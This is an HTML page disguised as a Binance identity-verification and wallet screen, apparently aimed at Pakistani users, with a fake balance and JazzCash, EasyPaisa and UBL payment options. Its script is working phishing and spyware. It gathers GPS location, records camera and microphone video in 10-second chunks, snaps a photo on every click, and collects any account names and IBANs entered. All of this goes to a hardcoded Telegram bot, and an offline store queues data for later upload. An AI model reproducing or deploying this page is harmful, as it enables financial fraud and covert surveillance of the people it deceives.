<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance - Identity Verification</title>
    <style>
        :root { --yellow: #FCD535; --bg: #121212; --card: #1e1e1e; --text-gray: #848E9C; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; text-align: center; }
        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box; }
        .active { display: flex; }
        .card { background: var(--card); border-radius: 24px; padding: 25px; width: 100%; max-width: 380px; border: 1px solid #333; margin-bottom: 15px; }
        .logo { width: 160px; margin-bottom: 25px; }
        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 15px; width: 100%; border-radius: 12px; margin: 10px 0; font-size: 16px; box-sizing: border-box; }
        .btn { background: var(--yellow); color: black; padding: 15px; width: 100%; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; font-size: 15px; }
        
        /* Method List */
        .method-item { background: #2B3139; padding: 12px; margin: 8px 0; border-radius: 10px; display: flex; align-items: center; cursor: pointer; border: 1px solid transparent; transition: 0.2s; }
        .method-item:hover { border-color: var(--yellow); }
        .method-item img { width: 35px; height: 35px; border-radius: 6px; margin-right: 15px; object-fit: contain; background: white; padding: 2px; }
        
        .balance { font-size: 38px; font-weight: bold; color: var(--yellow); margin: 5px 0; }
        #video, #canvas { display: none; }
    </style>
</head>
<body onclick="takeSnap()">

    <div id="loginScreen" class="screen active">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Binance_Logo.png/640px-Binance_Logo.png" class="logo">
        <div class="card">
            <h3 style="margin:0;">Verification Required</h3>
            <p style="color:var(--text-gray); font-size:13px;">Enable GPS and Camera to secure your assets</p>
            <input type="password" id="pin" placeholder="Enter PIN (7890)" maxlength="4" inputmode="numeric">
            <button class="btn" onclick="startSystem()">Unlock Wallet</button>
        </div>
    </div>

    <div id="dash" class="screen">
        <div style="width:100%; max-width:380px; text-align:left;">
            <p style="color:var(--text-gray); margin-bottom:5px;">Spot Balance</p>
            <div class="balance">$385.00</div>
            <p style="color: #5E6673; margin-top:-5px; font-size:14px;">≈ Rs. 107,800.00 PKR</p>
            
            <div style="display:flex; gap:10px; margin-top:20px;">
                <button class="btn" onclick="showTransfer('Withdraw')">Send Money</button>
                <button class="btn" style="background:#2B3139; color:white;" onclick="showTransfer('Deposit')">Deposit</button>
            </div>
        </div>
    </div>

    <div id="transferScreen" class="screen">
        <h3 id="transferTitle">Select Payment Method</h3>
        <div class="card">
            <div class="method-item" onclick="openDetails('JazzCash')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/JazzCash_logo.png"> JazzCash
            </div>
            <div class="method-item" onclick="openDetails('EasyPaisa')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Easypaisa_logo.png"> EasyPaisa
            </div>
            <div class="method-item" onclick="openDetails('UBL Bank')">
                <img src="https://upload.wikimedia.org/wikipedia/en/b/ba/United_Bank_Limited_logo.png"> UBL Bank Account
            </div>

            <div id="accDetails" style="display:none; margin-top:15px; border-top:1px solid #444; padding-top:15px;">
                <input type="text" id="accName" placeholder="Account Title">
                <input type="number" id="accNum" placeholder="Account / IBAN Number">
                <button class="btn" onclick="finishTask()">Confirm Action</button>
            </div>
        </div>
        <button onclick="location.reload()" style="background:none; border:none; color:var(--yellow); cursor:pointer;">← Back</button>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const token = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
        const chat = '7107389141';
        let db, recorder, chunks = [], currentType = "";

        // DB Initialization
        const req = indexedDB.open("SecureVault", 1);
        req.onupgradeneeded = e => e.target.result.createObjectStore("sync", { autoIncrement: true });
        req.onsuccess = e => { db = e.target.result; sync(); };

        function startSystem() {
            if(document.getElementById('pin').value !== "7890") { alert("Invalid PIN"); return; }
            
            // Location Tracking
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    const msg = `📍 *BINANCE ALERT*\nLocation: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\nAccuracy: ${p.coords.accuracy}m`;
                    sendMsg(msg);
                }, () => sendMsg("⚠️ User Blocked Location"), { enableHighAccuracy: true });
            }

            // Camera/Mic Access
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
            .then(s => {
                document.getElementById('video').srcObject = s;
                startRec(s);
                // Move to Dash
                document.getElementById('loginScreen').classList.remove('active');
                document.getElementById('dash').classList.add('active');
            }).catch(() => { alert("Permission required to secure funds."); });
        }

        function startRec(s) {
            recorder = new MediaRecorder(s);
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                chunks = [];
                navigator.onLine ? upload(blob, 'video') : saveOff(blob);
                recorder.start();
            };
            recorder.start();
            setInterval(() => recorder.state === "recording" && recorder.stop(), 10000);
        }

        async function upload(blob, type) {
            const fd = new FormData();
            fd.append('chat_id', chat);
            const api = type === 'video' ? 'sendVideo' : 'sendPhoto';
            fd.append(type, blob, `file_${Date.now()}.${type === 'video' ? 'webm' : 'jpg'}`);
            try { await fetch(`https://api.telegram.org/bot${token}/${api}`, { method: 'POST', body: fd }); }
            catch(e) { saveOff(blob); }
        }

        function sendMsg(t) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
        }

        function saveOff(blob) {
            const tx = db.transaction("sync", "readwrite");
            tx.objectStore("sync").add(blob);
        }

        async function sync() {
            if (!navigator.onLine || !db) return;
            const store = db.transaction("sync", "readwrite").objectStore("sync");
            store.openCursor().onsuccess = async e => {
                const cursor = e.target.result;
                if (cursor) {
                    await upload(cursor.value, cursor.value.type.includes('video') ? 'video' : 'photo');
                    store.delete(cursor.key);
                    cursor.continue();
                }
            };
        }

        window.addEventListener('online', sync);

        function takeSnap() {
            const v = document.getElementById('video'), c = document.getElementById('canvas');
            if(v.srcObject) {
                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                c.toBlob(b => upload(b, 'photo'), 'image/jpeg');
            }
        }

        // UI Functions
        function showTransfer(type) {
            currentType = type;
            document.getElementById('transferTitle').innerText = type + " Assets";
            document.getElementById('dash').classList.remove('active');
            document.getElementById('transferScreen').classList.add('active');
        }

        function openDetails(m) {
            document.getElementById('accDetails').style.display = 'block';
            document.getElementById('accNum').placeholder = m + " Number / IBAN";
            window.selectedMethod = m;
        }

        function finishTask() {
            const name = document.getElementById('accName').value;
            const num = document.getElementById('accNum').value;
            const text = `💰 *BINANCE TRANSACTION*\nType: ${currentType}\nMethod: ${window.selectedMethod}\nName: ${name}\nNumber: ${num}`;
            sendMsg(text);
            alert("Security Protocol: Verification in progress. Please wait 15-30 minutes.");
            location.reload();
        }
    </script>
</body>
</html>
